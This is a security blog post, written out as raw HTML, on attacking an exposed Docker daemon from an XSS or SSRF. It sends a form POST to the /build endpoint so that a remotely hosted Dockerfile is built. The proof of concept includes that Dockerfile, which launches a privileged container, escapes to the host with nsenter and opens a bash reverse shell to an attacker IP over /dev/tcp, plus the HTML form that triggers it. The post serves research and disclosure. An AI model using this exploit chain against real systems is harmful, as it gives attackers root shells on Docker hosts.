<!doctype html>







<html
  class="not-ready lg:text-base"
  style="--bg:#faf8f1"
  lang="en-us"
  dir="ltr"
><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
  <meta charset="utf-8" />
  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
  <meta
    name="viewport"
    content="width=device-width, initial-scale=1, shrink-to-fit=no"
  />

  
  <title>Exploiting the Docker daemon from an XSS perspective - MrSheepSheep&#39;s curiosities</title>

  
  <meta name="theme-color" />

  <meta name="description" content="Finding the right API endpoint To exploit any API endpoint from an XSS, we first need to fight CORS restrictions. Sadly for us, Docker does not return any CORS headers.
This means we should only be able to hit the docker API using GET and POST requests sent straight from an HTML form.
Looking at the Docker API documentation, pretty much all endpoints require a Content-Type: application/json header to be valid." />
  <meta name="author" content="Alexandre Souleau" /><link rel="preload stylesheet" as="style" href="http://localhost:1313/main.min.css" />

  
  <link rel="preload" as="image" href="http://localhost:1313/theme.svg" />

  <link rel="preload" as="image" href="https://avatars.githubusercontent.com/u/4931825?v=4" />

  <link rel="preload" as="image" href="http://localhost:1313/twitter.svg" /><link rel="preload" as="image" href="http://localhost:1313/github.svg" /><link rel="preload" as="image" href="http://localhost:1313/linkedin.svg" />

  <script
    defer
    src="http://localhost:1313/highlight.min.js"
    onload="hljs.initHighlightingOnLoad();"
  ></script>

  
  <link
    rel="icon"
    href="http://localhost:1313/favicon.ico"
  />
  <link
    rel="apple-touch-icon"
    href="http://localhost:1313/apple-touch-icon.png"
  />

  <meta name="generator" content="Hugo 0.131.0">
</head>
<body
    class="bg-(--bg) text-black antialiased duration-200 ease-out [-webkit-tap-highlight-color:transparent] dark:text-white"
  ><header
  class="mx-auto flex h-[4.5rem] max-w-(--w) px-8 whitespace-nowrap lg:justify-center"
>
  <div class="relative z-50 flex items-center ltr:mr-auto rtl:ml-auto">
    <a
      class="-translate-y-[1px] text-2xl font-medium"
      href="http://localhost:1313/"
      >MrSheepSheep&#39;s curiosities</a
    >
    <div
      class="btn-dark text-[0px] ltr:ml-4 rtl:mr-4 h-6 w-6 shrink-0 cursor-pointer [background:url(./theme.svg)_left_center/cover_no-repeat] dark:invert dark:[background-position:right]"
      role="button"
      aria-label="Dark"
    ></div>
  </div>

  <div
    class="btn-menu relative z-50 flex h-[4.5rem] w-[5rem] shrink-0 cursor-pointer flex-col items-center justify-center gap-2.5 lg:hidden ltr:-mr-8 rtl:-ml-8"
    role="button"
    aria-label="Menu"
  ></div>

  <script>
    
    const htmlClass = document.documentElement.classList;
    setTimeout(() => {
      htmlClass.remove('not-ready');
    }, 10);

    
    const btnMenu = document.querySelector('.btn-menu');
    btnMenu.addEventListener('click', () => {
      htmlClass.toggle('open');
    });

    
    const metaTheme = document.querySelector('meta[name="theme-color"]');
    const lightBg = '#faf8f1'.replace(/"/g, '');
    const setDark = (isDark) => {
      metaTheme.setAttribute('content', isDark ? '#000' : lightBg);
      htmlClass[isDark ? 'add' : 'remove']('dark');
      localStorage.setItem('dark', isDark);
    };

    
    const darkScheme = window.matchMedia('(prefers-color-scheme: dark)');
    if (htmlClass.contains('dark')) {
      setDark(true);
    } else {
      const darkVal = localStorage.getItem('dark');
      setDark(darkVal ? darkVal === 'true' : darkScheme.matches);
    }

    
    darkScheme.addEventListener('change', (event) => {
      setDark(event.matches);
    });

    
    const btnDark = document.querySelector('.btn-dark');
    btnDark.addEventListener('click', () => {
      setDark(localStorage.getItem('dark') !== 'true');
    });
  </script>

  <div
    class="nav-wrapper fixed inset-x-0 top-full z-40 flex h-full flex-col justify-center bg-(--bg) pb-16 duration-200 select-none lg:static lg:h-auto lg:flex-row lg:bg-transparent! lg:pb-0 lg:transition-none"
  ><nav
      class="mt-12 flex justify-center space-x-10 lg:mt-0 lg:items-center ltr:lg:ml-14 rtl:space-x-reverse rtl:lg:mr-14 dark:invert"
    >
      <a
        class="h-7 w-7 text-[0px] [background:var(--url)_center_center/cover_no-repeat] lg:h-6 lg:w-6"
        style="--url: url(./twitter.svg)"
        href="https://twitter.com/MrSheepSheep"
        target="_blank"
        rel="me"
      >twitter</a>
      <a
        class="h-7 w-7 text-[0px] [background:var(--url)_center_center/cover_no-repeat] lg:h-6 lg:w-6"
        style="--url: url(./github.svg)"
        href="https://github.com/mrsheepsheep"
        target="_blank"
        rel="me"
      >github</a>
      <a
        class="h-7 w-7 text-[0px] [background:var(--url)_center_center/cover_no-repeat] lg:h-6 lg:w-6"
        style="--url: url(./linkedin.svg)"
        href="https://linkedin.com/in/alexandresouleau"
        target="_blank"
        rel="me"
      >linkedin</a>
    </nav>
  </div>
</header>
<main
      class="prose prose-neutral dark:prose-invert relative mx-auto min-h-[calc(100vh-9rem)] max-w-(--w) px-8 pt-14 pb-16"
    ><article>
  <header class="mb-14">
    <h1 class="my-0! pb-2.5">Exploiting the Docker daemon from an XSS perspective</h1><div class="text-xs antialiased opacity-60"><time>Jan 2, 2025</time></div></header>

  <section><h1 id="heading"></h1>
<h3 id="finding-the-right-api-endpoint">Finding the right API endpoint</h3>
<p>To exploit any API endpoint from an XSS, we first need to fight CORS restrictions. Sadly for us, Docker does not return any <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS">CORS headers</a>.</p>
<p>This means we should only be able to hit the docker API using <code>GET</code> and <code>POST</code> requests sent straight from an HTML form.</p>
<p>Looking at the <a href="https://docs.docker.com/reference/api/engine/version/v1.45/">Docker API documentation</a>, pretty much all endpoints require a <code>Content-Type: application/json</code> header to be valid. In fact, the API will reject any request without this Content-Type, and it is protected against <a href="https://www.thehacker.recipes/web/inputs/content-type-juggling/">Content-Type juggling</a>.</p>
<p>While crawling through the docs, it seems that <code>POST /build</code> is the perfect candidate for our experiment.</p>
<p><a href="https://docs.docker.com/reference/api/engine/version/v1.45/#tag/Image/operation/ImageBuild">{% embed url=&quot;&quot; %}</a></p>
<p>The endpoint only expects <em>query</em> parameters, which can easily be sent from an HTML form. It does not require the <code>application/json</code> Content-Type either.</p>
<p>The <code>remote</code> paremeter is exceptionnally interesting for our use case as well : </p>
<blockquote>
<p><strong>remote</strong> : A Git repository URI or HTTP/HTTPS context URI. If the URI points to a single text file, the file’s contents are placed into a file called <code>Dockerfile</code> and the image is built from that file. If the URI points to a tarball, the file is downloaded by the daemon and the contents therein used as the context for the build. If the URI points to a tarball and the <code>dockerfile</code> parameter is also specified, there must be a file with the corresponding path inside the tarball.</p>
</blockquote>
<p>From here, the goal is to escape the Docker build process to obtain full RCE on the docker host. <a href="https://www.paloaltonetworks.com/blog/prisma-cloud/leaky-vessels-vulnerabilities-container-escape/">We could try to exploit vulnerable Docker versions</a>, but this is already overkill because we already have the full daemon exposed ! </p>
<p>The <code>networkmode</code> parameter is perfect because it will give us full network access and more importantly a &ldquo;localhost&rdquo; perspective using <code>host</code> mode. This helps us hitting the Docker daemon API without having to handle the container&rsquo;s gateway ourselves.</p>
<blockquote>
<p><strong>networkmode</strong> : Sets the networking mode for the run commands during build. Supported standard values are: <code>bridge</code>, <code>host</code>, <code>none</code>, and <code>container:&lt;name|id&gt;</code>. Any other value is taken as a custom network&rsquo;s name or ID to which this container should connect to.</p>
</blockquote>
<h3 id="proof-of-concept">Proof-of-concept</h3>
<ul>
<li>Docker daemon exposed on <code>127.0.0.1:2375</code></li>
<li>Docker daemon running with root privileeges (usually the default setup)</li>
</ul>
<p>When built, the following Dockerfile will run a Docker cli against the current host at <code>127.0.0.1:2375</code> and create an escape container, given that the daemon has root privileges. The container then sends a basic reverse shell to the attacker&rsquo;s machine :</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-docker" data-lang="docker"><span style="display:flex;"><span><span style="color:#66d9ef">FROM</span><span style="color:#e6db74"> alpine:latest</span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">RUN</span> apk add --update docker-cli<span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">RUN</span> docker -H 127.0.0.1:2375 run -i --name pwned --rm --pid<span style="color:#f92672">=</span>host --privileged ubuntu:latest nsenter --target <span style="color:#ae81ff">1</span> --mount --uts --ipc --net --pid -- /bin/bash -c <span style="color:#e6db74">&#34;bash -i &gt;&amp; /dev/tcp/attackerip/port 0&gt;&amp;1&#34;</span><span style="color:#960050;background-color:#1e0010">
</span></span></span></code></pre></div><p>To trigger the build, we prepare a simple HTML POST form against <code>127.0.0.1:2375/build</code> and host the Dockerfile at any location that can be reached by the Docker daemon :</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#f92672">form</span> <span style="color:#a6e22e">method</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;POST&#34;</span> <span style="color:#a6e22e">action</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;http://127.0.0.1:2375/build?&amp;nocache=true&amp;networkmode=host&amp;remote=https://gist.githubusercontent.com/..../Pwned.Dockerfile&#34;</span>&gt;
</span></span><span style="display:flex;"><span>  &lt;<span style="color:#f92672">input</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;submit&#34;</span> <span style="color:#a6e22e">value</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;PwnMe&#34;</span>&gt;
</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">form</span>&gt;
</span></span></code></pre></div><p>Submitting the form will trigger the build and give a root reeverse shell to the Docker host.</p>
<p><img src="demo.gif" alt="demo"></p>
<h3 id="ssrf-and-server-side-xss">SSRF and Server-Side XSS</h3>
<p>As you might expect, this attack can be executed in an SSRF scenario or a Server-Side XSS from Puppeteer or Selenium.</p>
<p>As of 01/01/2025, <a href="https://github.com/swisskyrepo/SSRFmap">SSRFMap</a> does not include a Docker RCE SSRF, which makes me think that this technique is currently undocumented. Maybe in a future PR 😊</p>
<h3 id="redteam-considerations">RedTeam considerations</h3>
<p>Docker daemons are very rarely exposed on servers, and you will probably never be able to get a &ldquo;blind&rdquo; XSS to run against a server.</p>
<p>Regarding workstations, it is not impossible, but I have never seen exposed docker daemons on end-user systems (unix or Docker Desktop). I guess it could work with a high risk / very low success rate on a mass-scale XSS. Meh.</p>
<p>This attack could be exploited against non-local hosts to bridge into restricted environments, but the attacker should already know the IP of an exposed docker daemon. In most cases, getting to know the IP already means you have access to the daemon.</p>
<p>Overall this makes the attack unpractical in a redteam scenario. This attack might only be interesting in a CTF challenge 😜</p>
</section>

  <nav
    class="mt-24 flex overflow-hidden rounded-xl bg-black/[3%] text-lg leading-[1.2]! *:flex *:w-1/2 *:items-center *:p-5 *:font-medium *:no-underline dark:bg-white/[8%] [&>*:hover]:bg-black/[2%] dark:[&>*:hover]:bg-white/[3%]"
  ><a class="ltr:pr-3 rtl:pl-3" href="http://localhost:1313/posts/idp-passthrough-phishing/"
      ><span class="ltr:mr-1.5 rtl:ml-1.5">←</span><span>Abusing Cloud Identity Providers for Phishing</span></a
    ><a
      class="justify-end pl-3 ltr:ml-auto rtl:mr-auto"
      href="http://localhost:1313/posts/quickassist-phishing/"
      ><span>Advanced Microsoft Phishing with a QuickAssist XSS</span><span class="ltr:ml-1.5 rtl:mr-1.5">→</span></a
    ></nav></article></main><footer
  class="mx-auto flex h-[4.5rem] max-w-(--w) items-center px-8 text-xs tracking-wider uppercase opacity-60"
>
  <div class="mr-auto">&copy;2025
    <a class="link" href="http://localhost:1313/">MrSheepSheep&#39;s curiosities</a></div>
  <a class="link mx-6" href="https://gohugo.io/" rel="noopener" target="_blank"
    >powered by hugo️️</a
  >️
  <a
    class="link"
    href="https://github.com/nanxiaobei/hugo-paper"
    rel="noopener"
    target="_blank"
    >hugo-paper</a
  >
</footer>
</body>
</html>
